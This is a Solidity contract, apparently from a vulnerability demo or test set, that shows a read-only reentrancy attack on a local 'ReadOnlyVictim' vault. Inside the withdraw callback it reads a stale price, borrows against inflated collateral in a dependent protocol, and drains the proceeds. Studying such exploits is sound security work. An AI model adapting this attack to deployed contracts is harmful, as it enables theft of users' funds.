// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ReadOnlyVictim.sol";

/**
 * Attacker3_ReadOnly
 * Read-only reentrancy: during withdraw() callback, reads stale getPrice()
 * from ReadOnlyVictim and exploits DependentProtocol.borrow().
 *
 * Call with >= 2 ETH: 1 for vault deposit, 1 for collateral.
 */
contract Attacker3_ReadOnly {
    ReadOnlyVictim public vault;
    DependentProtocol public dependent;
    bool public inCallback;
    uint256 public stalePriceRead;

    constructor(address _vault, address _dependent) {
        vault = ReadOnlyVictim(payable(_vault));
        dependent = DependentProtocol(_dependent);
    }

    function attack() external payable {
        require(msg.value >= 2 ether, "need 2 ETH");
        // Deposit 1 ETH as collateral into dependent protocol
        dependent.depositCollateral{value: 1 ether}();
        // Deposit remaining into vault
        vault.deposit{value: msg.value - 1 ether}();
        // Trigger withdraw — callback will read stale price
        vault.withdraw();
    }

    receive() external payable {
        if (!inCallback) {
            inCallback = true;
            // Read stale price (vault balance not yet updated)
            stalePriceRead = vault.getPrice();
            // Exploit: borrow against inflated collateral value
            dependent.borrow();
            inCallback = false;
        }
    }

    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
